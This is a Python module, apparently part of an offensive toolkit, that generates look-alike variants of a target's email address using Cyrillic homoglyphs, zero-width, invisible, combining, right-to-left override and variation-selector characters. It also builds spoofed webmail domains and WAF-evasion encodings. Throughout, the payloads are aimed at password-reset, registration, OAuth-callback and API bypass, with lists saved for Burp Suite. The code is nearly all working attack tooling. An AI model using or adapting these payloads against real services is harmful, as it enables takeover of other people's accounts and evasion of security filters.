# modules/payload_generator.py - Complete Elite Version
import unicodedata
from itertools import product, combinations
import random
import json
import re
import base64
import urllib.parse
from typing import List, Dict, Any

class PayloadGenerator:
    def __init__(self, character_db):
        self.character_db = character_db if character_db else []
        self.evasion_techniques = []
        
        # Attack patterns for different contexts
        self.email_patterns = {
            'forgot_password': ['email', 'username', 'user_email', 'login_email'],
            'registration': ['email', 'user_email', 'signup_email', 'account_email'],
            'oauth_callback': ['email', 'user_id', 'account_id'],
            'api_endpoints': ['email', 'user', 'account']
        }
        
    async def generate_email_variants(self, target_email):
        """Generate comprehensive email variants using elite characters"""
        if not target_email or '@' not in target_email:
            return []
            
        try:
            local, domain = target_email.split('@', 1)
        except ValueError:
            return []
            
        variants = []
        
        # Priority-based character substitution
        effectiveness_priority = ['Very High', 'High', 'Medium', 'Low']
        
        for priority in effectiveness_priority:
            priority_chars = [char for char in self.character_db 
                            if char.get('effectiveness') == priority]
            
            for char_data in priority_chars:
                target_char = char_data.get('target', '')
                puny_char = char_data.get('char', '')
                
                if not target_char or not puny_char:
                    continue
                
                # Replace in local part (username)
                if target_char in local:
                    new_local = local.replace(target_char, puny_char, 1)  # Replace only first occurrence
                    new_email = f"{new_local}@{domain}"
                    
                    variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'original_char': target_char,
                        'puny_char': puny_char,
                        'unicode_point': char_data.get('unicode'),
                        'script': char_data.get('script'),
                        'effectiveness': char_data.get('effectiveness'),
                        'hex': char_data.get('hex'),
                        'substitution_location': 'local',
                        'attack_type': 'single_substitution'
                    })
                
                # Replace in domain part
                if target_char in domain:
                    new_domain = domain.replace(target_char, puny_char, 1)
                    new_email = f"{local}@{new_domain}"
                    
                    variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'original_char': target_char,
                        'puny_char': puny_char,
                        'unicode_point': char_data.get('unicode'),
                        'script': char_data.get('script'),
                        'effectiveness': char_data.get('effectiveness'),
                        'hex': char_data.get('hex'),
                        'substitution_location': 'domain',
                        'attack_type': 'single_substitution'
                    })
                    
                # Replace in both local and domain (multiple occurrences)
                if target_char in local and target_char in domain:
                    new_local = local.replace(target_char, puny_char)
                    new_domain = domain.replace(target_char, puny_char)
                    new_email = f"{new_local}@{new_domain}"
                    
                    variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'original_char': target_char,
                        'puny_char': puny_char,
                        'unicode_point': char_data.get('unicode'),
                        'script': char_data.get('script'),
                        'effectiveness': char_data.get('effectiveness'),
                        'hex': char_data.get('hex'),
                        'substitution_location': 'both',
                        'attack_type': 'multiple_substitution'
                    })
        
        # Generate combo variants (multiple character substitutions)
        combo_variants = await self.generate_combo_variants(target_email)
        variants.extend(combo_variants)
        
        # Generate special character insertion attacks
        special_variants = await self.generate_special_variants(target_email)
        variants.extend(special_variants)
        
        # Generate domain confusion variants
        domain_variants = await self.generate_domain_variants(target_email)
        variants.extend(domain_variants)
        
        # Remove duplicates while preserving order
        seen_emails = set()
        unique_variants = []
        for variant in variants:
            email = variant.get('email', '')
            if email and email not in seen_emails and email != target_email:
                seen_emails.add(email)
                unique_variants.append(variant)
        
        return unique_variants
    
    async def generate_combo_variants(self, target_email):
        """Generate variants with multiple character substitutions"""
        combo_variants = []
        local, domain = target_email.split('@', 1)
        
        # Get high-effectiveness characters only for combos
        high_eff_chars = [char for char in self.character_db 
                         if char.get('effectiveness') in ['Very High', 'High']]
        
        # Double substitution (2 different characters)
        for i, char1 in enumerate(high_eff_chars[:15]):  # Limit to prevent explosion
            for char2 in high_eff_chars[i+1:15]:
                target1 = char1.get('target', '')
                target2 = char2.get('target', '')
                puny1 = char1.get('char', '')
                puny2 = char2.get('char', '')
                
                if not all([target1, target2, puny1, puny2]) or target1 == target2:
                    continue
                
                # Double substitution in local part
                if target1 in local and target2 in local:
                    new_local = local.replace(target1, puny1).replace(target2, puny2)
                    if new_local != local:  # Ensure substitution happened
                        new_email = f"{new_local}@{domain}"
                        
                        combo_variants.append({
                            'email': new_email,
                            'original_email': target_email,
                            'attack_type': 'combo_double',
                            'substitution_location': 'local',
                            'substitutions': [
                                {'original': target1, 'puny': puny1, 'script': char1.get('script'), 'effectiveness': char1.get('effectiveness')},
                                {'original': target2, 'puny': puny2, 'script': char2.get('script'), 'effectiveness': char2.get('effectiveness')}
                            ]
                        })
                
                # Cross substitution (local + domain)
                if target1 in local and target2 in domain:
                    new_local = local.replace(target1, puny1)
                    new_domain = domain.replace(target2, puny2)
                    new_email = f"{new_local}@{new_domain}"
                    
                    combo_variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'attack_type': 'combo_cross',
                        'substitution_location': 'cross',
                        'substitutions': [
                            {'original': target1, 'puny': puny1, 'script': char1.get('script'), 'location': 'local'},
                            {'original': target2, 'puny': puny2, 'script': char2.get('script'), 'location': 'domain'}
                        ]
                    })
        
        return combo_variants[:50]  # Limit combo variants
    
    async def generate_special_variants(self, target_email):
        """Generate variants using special Unicode tricks"""
        special_variants = []
        local, domain = target_email.split('@', 1)
        
        # Zero-width character insertion
        zero_width_chars = [char for char in self.character_db 
                           if char.get('type') == 'zero_width']
        
        for zw_char_data in zero_width_chars:
            zw_char = zw_char_data.get('char', '')
            
            if not zw_char:
                continue
            
            # Insert zero-width characters at strategic positions
            positions = [
                ('start', 0),
                ('middle', len(local)//2),
                ('end', len(local)),
                ('before_at', len(local)),
                ('after_at', len(local) + 1),
                ('domain_middle', len(local) + 1 + len(domain)//2)
            ]
            
            for pos_name, pos in positions:
                try:
                    if pos_name in ['before_at', 'after_at', 'domain_middle']:
                        if pos_name == 'before_at':
                            new_email = local + zw_char + '@' + domain
                        elif pos_name == 'after_at':
                            new_email = local + '@' + zw_char + domain
                        else:  # domain_middle
                            mid_pos = len(domain)//2
                            new_domain = domain[:mid_pos] + zw_char + domain[mid_pos:]
                            new_email = local + '@' + new_domain
                    else:
                        new_local = local[:pos] + zw_char + local[pos:]
                        new_email = f"{new_local}@{domain}"
                    
                    special_variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'attack_type': 'zero_width_insertion',
                        'position': pos_name,
                        'position_index': pos,
                        'inserted_char': zw_char,
                        'hex': zw_char_data.get('hex'),
                        'unicode_point': zw_char_data.get('unicode')
                    })
                except:
                    continue
        
        # Invisible character replacement
        invisible_chars = [char for char in self.character_db 
                          if char.get('type') == 'invisible']
        
        for inv_char_data in invisible_chars:
            inv_char = inv_char_data.get('char')
            target_char = inv_char_data.get('target')
            
            if not inv_char or not target_char:
                continue
            
            if target_char in target_email:
                new_email = target_email.replace(target_char, inv_char, 1)
                special_variants.append({
                    'email': new_email,
                    'original_email': target_email,
                    'attack_type': 'invisible_replacement',
                    'original_char': target_char,
                    'invisible_char': inv_char,
                    'hex': inv_char_data.get('hex')
                })
        
        # Combining character attacks
        combining_chars = [char for char in self.character_db 
                          if char.get('type') == 'combining']
        
        for comb_char_data in combining_chars:
            comb_char = comb_char_data.get('char', '')
            if not comb_char:
                continue
                
            # Add combining characters to vowels
            vowels = ['a', 'e', 'i', 'o', 'u']
            for vowel in vowels:
                if vowel in local:
                    new_local = local.replace(vowel, vowel + comb_char, 1)
                    new_email = f"{new_local}@{domain}"
                    
                    special_variants.append({
                        'email': new_email,
                        'original_email': target_email,
                        'attack_type': 'combining_character',
                        'base_char': vowel,
                        'combining_char': comb_char,
                        'hex': comb_char_data.get('hex')
                    })
        
        return special_variants[:30]  # Limit special variants
    
    async def generate_domain_variants(self, target_email):
        """Generate puny-code domain variants"""
        local, domain = target_email.split('@', 1)
        variants = []
        
        # IDN homograph attacks for common domains
        common_domains = {
            'gmail.com': ['gmаil.com', 'gmai1.com', 'gmaіl.com', 'ɡmail.com'],
            'yahoo.com': ['уahoo.com', 'yahoo.сom', 'yahoо.com'],
            'outlook.com': ['оutlook.com', 'outlook.сom', 'оutlооk.com'],
            'hotmail.com': ['hоtmail.com', 'hotmail.сom', 'hotmaіl.com'],
            'icloud.com': ['іcloud.com', 'icloud.сom', 'icIoud.com']
        }
        
        # Check if domain matches common patterns
        for real_domain, fake_domains in common_domains.items():
            if domain.lower() == real_domain:
                for fake_domain in fake_domains:
                    variants.append({
                        'email': f"{local}@{fake_domain}",
                        'original_email': target_email,
                        'attack_type': 'domain_homograph',
                        'original_domain': real_domain,
                        'fake_domain': fake_domain,
                        'substitution_location': 'domain'
                    })
        
        # Generic domain character substitution
        high_eff_chars = [char for char in self.character_db 
                         if char.get('effectiveness') in ['Very High', 'High']]
        
        for char_data in high_eff_chars[:20]:  # Limit for performance
            target_char = char_data.get('target', '')
            puny_char = char_data.get('char', '')
            
            if target_char and puny_char and target_char in domain:
                new_domain = domain.replace(target_char, puny_char, 1)
                variants.append({
                    'email': f"{local}@{new_domain}",
                    'original_email': target_email,
                    'attack_type': 'domain_substitution',
                    'original_char': target_char,
                    'puny_char': puny_char,
                    'script': char_data.get('script'),
                    'effectiveness': char_data.get('effectiveness')
                })
        
        return variants
    
    async def generate_waf_bypass_payloads(self, base_payload):
        """Generate WAF bypass variants using advanced encoding techniques"""
        bypass_techniques = []
        
        try:
            # URL encoding variations
            url_encoded = urllib.parse.quote(base_payload, safe='')
            bypass_techniques.append(url_encoded)
            
            # Partial URL encoding (encode only special chars)
            partial_encoded = base_payload.replace('@', '%40').replace('.', '%2E')
            bypass_techniques.append(partial_encoded)
            
            # Double URL encoding
            double_encoded = urllib.parse.quote(urllib.parse.quote(base_payload, safe=''), safe='')
            bypass_techniques.append(double_encoded)
            
            # Unicode normalization variants
            try:
                nfc_normalized = unicodedata.normalize('NFC', base_payload)
                nfd_normalized = unicodedata.normalize('NFD', base_payload)
                nfkc_normalized = unicodedata.normalize('NFKC', base_payload)
                nfkd_normalized = unicodedata.normalize('NFKD', base_payload)
                
                bypass_techniques.extend([nfc_normalized, nfd_normalized, nfkc_normalized, nfkd_normalized])
            except:
                pass
            
            # Mixed case variations
            mixed_case = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(base_payload)])
            bypass_techniques.append(mixed_case)
            
            # HTML entity encoding
            html_encoded = base_payload.replace('@', '&#64;').replace('.', '&#46;')
            bypass_techniques.append(html_encoded)
            
            # Hex encoding variants
            hex_encoded = base_payload.replace('@', '\\x40').replace('.', '\\x2E')
            bypass_techniques.append(hex_encoded)
            
            # Base64 encoding (for API contexts)
            try:
                b64_encoded = base64.b64encode(base_payload.encode()).decode()
                bypass_techniques.append(b64_encoded)
            except:
                pass
            
            # Unicode escape sequences
            unicode_escaped = base_payload.replace('@', '\\u0040').replace('.', '\\u002E')
            bypass_techniques.append(unicode_escaped)
            
            # JSON escape sequences
            json_escaped = base_payload.replace('@', '\\u0040').replace('.', '\\u002e')
            bypass_techniques.append(json_escaped)
            
            # Tab and space variations
            tab_variant = base_payload.replace(' ', '\t')
            bypass_techniques.append(tab_variant)
            
            # Case variation for domains
            if '@' in base_payload:
                local, domain = base_payload.split('@', 1)
                case_variants = [
                    f"{local}@{domain.upper()}",
                    f"{local}@{domain.lower()}",
                    f"{local.upper()}@{domain}",
                    f"{local.lower()}@{domain.upper()}"
                ]
                bypass_techniques.extend(case_variants)
            
        except Exception as e:
            print(f"WAF bypass generation error: {e}")
        
        # Remove duplicates and original
        unique_bypasses = []
        seen = {base_payload}
        
        for bypass in bypass_techniques:
            if bypass and bypass not in seen:
                seen.add(bypass)
                unique_bypasses.append(bypass)
        
        return unique_bypasses
    
    async def generate_context_specific_payloads(self, target_email, context='forgot_password'):
        """Generate payloads optimized for specific attack contexts"""
        context_payloads = []
        
        # Get base email variants
        base_variants = await self.generate_email_variants(target_email)
        
        # Context-specific modifications
        if context == 'forgot_password':
            # Focus on high-effectiveness characters for password reset bypass
            high_eff_variants = [v for v in base_variants if v.get('effectiveness') in ['Very High', 'High']]
            context_payloads.extend(high_eff_variants[:30])
            
        elif context == 'registration':
            # Include all variants for account creation bypass
            context_payloads.extend(base_variants[:50])
            
        elif context == 'oauth_callback':
            # Focus on domain confusion for OAuth provider bypass
            domain_variants = [v for v in base_variants if v.get('substitution_location') in ['domain', 'both']]
            context_payloads.extend(domain_variants[:20])
            
        elif context == 'api_endpoints':
            # Include encoding variants for API bypass
            for variant in base_variants[:20]:
                email = variant.get('email', '')
                if email:
                    waf_bypasses = await self.generate_waf_bypass_payloads(email)
                    for bypass in waf_bypasses[:5]:
                        context_payloads.append({
                            'email': bypass,
                            'original_email': target_email,
                            'base_variant': variant,
                            'attack_type': 'api_bypass',
                            'encoding': 'waf_bypass'
                        })
        
        return context_payloads
    
    async def generate_advanced_evasion_payloads(self, target_email):
        """Generate advanced evasion payloads for sophisticated targets"""
        evasion_payloads = []
        
        # RTL (Right-to-Left) override attacks
        rtl_chars = ['\u202E', '\u202D', '\u061C']  # RTL override, LTR override, Arabic letter mark
        
        for rtl_char in rtl_chars:
            local, domain = target_email.split('@', 1)
            
            # Insert RTL characters at various positions
            positions = [0, len(local)//2, len(local)]
            for pos in positions:
                new_local = local[:pos] + rtl_char + local[pos:]
                evasion_payloads.append({
                    'email': f"{new_local}@{domain}",
                    'original_email': target_email,
                    'attack_type': 'rtl_override',
                    'rtl_char': rtl_char,
                    'position': pos
                })
        
        # Bidirectional text attacks
        bidi_chars = ['\u2066', '\u2067', '\u2068', '\u2069']  # Various directional isolates
        
        for bidi_char in bidi_chars:
            evasion_payloads.append({
                'email': target_email.replace('@', bidi_char + '@'),
                'original_email': target_email,
                'attack_type': 'bidi_isolation',
                'bidi_char': bidi_char
            })
        
        # Variation selector attacks
        variation_selectors = ['\uFE00', '\uFE01', '\uFE02', '\uFE0F']
        
        for vs in variation_selectors:
            local, domain = target_email.split('@', 1)
            # Add variation selectors to vowels
            for vowel in ['a', 'e', 'i', 'o', 'u']:
                if vowel in local:
                    new_local = local.replace(vowel, vowel + vs, 1)
                    evasion_payloads.append({
                        'email': f"{new_local}@{domain}",
                        'original_email': target_email,
                        'attack_type': 'variation_selector',
                        'base_char': vowel,
                        'selector': vs
                    })
        
        return evasion_payloads
    
    async def save_payloads(self, payloads, filename):
        """Save generated payloads to multiple formats"""
        try:
            # Create directory if it doesn't exist
            import os
            os.makedirs(os.path.dirname(filename) if os.path.dirname(filename) else 'payloads', exist_ok=True)
            
            # JSON format (detailed)
            with open(f"{filename}.json", 'w', encoding='utf-8') as f:
                json.dump(payloads, f, indent=2, ensure_ascii=False)
            
            # Simple email list (for tools like Burp Suite)
            with open(f"{filename}_emails.txt", 'w', encoding='utf-8') as f:
                for payload in payloads:
                    email = payload.get('email', '')
                    if email:
                        f.write(email + '\n')
            
            # CSV format (for spreadsheet analysis)
            import csv
            with open(f"{filename}.csv", 'w', newline='', encoding='utf-8') as f:
                if payloads:
                    # Get all possible fieldnames
                    fieldnames = set()
                    for payload in payloads:
                        fieldnames.update(payload.keys())
                    
                    writer = csv.DictWriter(f, fieldnames=sorted(fieldnames))
                    writer.writeheader()
                    for payload in payloads:
                        writer.writerow(payload)
            
            print(f"✅ Payloads saved to {filename}.* (JSON, TXT, CSV)")
            
        except Exception as e:
            print(f"⚠️ Error saving payloads: {e}")
    
    async def generate_comprehensive_payload_suite(self, target_email, contexts=['forgot_password', 'registration']):
        """Generate comprehensive payload suite for all contexts"""
        comprehensive_suite = {
            'target_email': target_email,
            'generation_stats': {},
            'payloads_by_context': {},
            'all_payloads': []
        }
        
        all_payloads = []
        
        # Generate for each context
        for context in contexts:
            context_payloads = await self.generate_context_specific_payloads(target_email, context)
            comprehensive_suite['payloads_by_context'][context] = context_payloads
            all_payloads.extend(context_payloads)
        
        # Add advanced evasion payloads
        evasion_payloads = await self.generate_advanced_evasion_payloads(target_email)
        comprehensive_suite['payloads_by_context']['advanced_evasion'] = evasion_payloads
        all_payloads.extend(evasion_payloads)
        
        # Remove duplicates from all_payloads
        seen_emails = set()
        unique_payloads = []
        for payload in all_payloads:
            email = payload.get('email', '')
            if email and email not in seen_emails:
                seen_emails.add(email)
                unique_payloads.append(payload)
        
        comprehensive_suite['all_payloads'] = unique_payloads
        
        # Generate statistics
        comprehensive_suite['generation_stats'] = {
            'total_payloads': len(unique_payloads),
            'contexts_covered': len(contexts) + 1,  # +1 for advanced_evasion
            'unique_emails': len(seen_emails),
            'effectiveness_breakdown': self._calculate_effectiveness_stats(unique_payloads),
            'attack_type_breakdown': self._calculate_attack_type_stats(unique_payloads),
            'script_breakdown': self._calculate_script_stats(unique_payloads)
        }
        
        return comprehensive_suite
    
    def _calculate_effectiveness_stats(self, payloads):
        """Calculate effectiveness statistics"""
        stats = {'Very High': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Unknown': 0}
        for payload in payloads:
            effectiveness = payload.get('effectiveness', 'Unknown')
            if effectiveness in stats:
                stats[effectiveness] += 1
            else:
                stats['Unknown'] += 1
        return stats
    
    def _calculate_attack_type_stats(self, payloads):
        """Calculate attack type statistics"""
        stats = {}
        for payload in payloads:
            attack_type = payload.get('attack_type', 'unknown')
            stats[attack_type] = stats.get(attack_type, 0) + 1
        return stats
    
    def _calculate_script_stats(self, payloads):
        """Calculate script usage statistics"""
        stats = {}
        for payload in payloads:
            script = payload.get('script', 'unknown')
            stats[script] = stats.get(script, 0) + 1
        return stats

# Example usage
if __name__ == "__main__":
    import asyncio
    
    async def test_payload_generation():
        # Mock character database
        test_chars = [
            {'unicode': 1072, 'char': 'а', 'target': 'a', 'hex': '0x430', 'script': 'Cyrillic', 'effectiveness': 'Very High'},
            {'unicode': 1086, 'char': 'о', 'target': 'o', 'hex': '0x43e', 'script': 'Cyrillic', 'effectiveness': 'Very High'},
            {'unicode': 1077, 'char': 'е', 'target': 'e', 'hex': '0x435', 'script': 'Cyrillic', 'effectiveness': 'Very High'}
        ]
        
        payload_gen = PayloadGenerator(test_chars)
        
        # Test comprehensive suite generation
        test_email = "test@example.com"
        suite = await payload_gen.generate_comprehensive_payload_suite(test_email)
        
        print(f"Generated {suite['generation_stats']['total_payloads']} unique payloads")
        print("Effectiveness breakdown:", suite['generation_stats']['effectiveness_breakdown'])
        print("Attack type breakdown:", suite['generation_stats']['attack_type_breakdown'])
        
        # Save results
        await payload_gen.save_payloads(suite['all_payloads'], 'test_payloads')
        
    asyncio.run(test_payload_generation())
